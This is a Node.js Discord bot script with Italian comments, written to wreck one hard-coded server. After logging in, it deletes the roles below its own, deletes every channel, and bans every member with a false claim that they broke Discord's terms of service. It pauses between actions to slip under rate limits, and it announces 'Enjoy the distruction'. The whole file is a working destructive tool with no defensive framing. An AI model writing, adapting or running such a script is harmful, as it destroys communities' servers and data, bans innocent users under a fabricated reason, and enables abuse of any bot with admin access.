const { Client, GatewayIntentBits } = require('discord.js');
const { token } = require('./config.json');

// Create a new client instance
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
const guildId = "755484634640416848";

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

client.once('ready', async () => {
    console.log(`Ready! Enjoy the distruction 👀`);

    const guild = await client.guilds.fetch(guildId);
    console.log(guild.name);
    try {
        // Fetch dei ruoli direttamente dalla guild
        const roles = await guild.roles.fetch();
        const botHighestRole = guild.members.me.roles.highest;

        // Elimina tutti i ruoli (tranne ruoli di sistema e il ruolo @everyone)
        for (const role of roles.values()) {
            if (!role.managed && role.name !== '@everyone' && role.comparePositionTo(botHighestRole) < 0) {
                await sleep(1000); // Sleep di 1 secondo tra le eliminazioni
                try {
                    await role.delete();
                    console.log(`Ruolo eliminato: ${role.name}`);
                } catch (error) {
                    console.error(`Errore nell'eliminare il ruolo ${role.name}`);
                }
            }
        }

        console.log("Tutti i ruoli sono stati eliminati!");

        // Fetch dei canali direttamente dalla guild
        const channels = await guild.channels.fetch();

        // Elimina tutti i canali
        for (const channel of channels.values()) {
            try {
                await sleep(2000); // Sleep di 1 secondo tra le eliminazioni
                await channel.delete();
                console.log(`Canale eliminato: ${channel.name}`);
            } catch (error) {
                console.error(`Errore nell'eliminare il canale ${channel.name}`);
            }
        }

        console.log("Tutti i canali sono stati eliminati!");

        // Fetch dei membri direttamente dalla guild
        const members = await guild.members.fetch();

        // Banna tutti i membri
        for (const member of members.values()) {
            try {
                await sleep(2000); // Sleep di 1 secondo tra i ban
                await member.ban({ reason: 'Violazione dei TOS di Discord.' });
                console.log(`Membro bannato: ${member.user.tag}`);
            } catch (error) {
                console.error(`Errore nel bannare il membro ${member.user.tag}`);
            }
        }

        console.log("Tutti i membri sono stati bannati!");
        client.destroy();

    } catch (error) {
        console.error(`Errore nel fetch dei ruoli, canali o membri`);
    }
});

// Log in to Discord with your client's token
client.login(token);
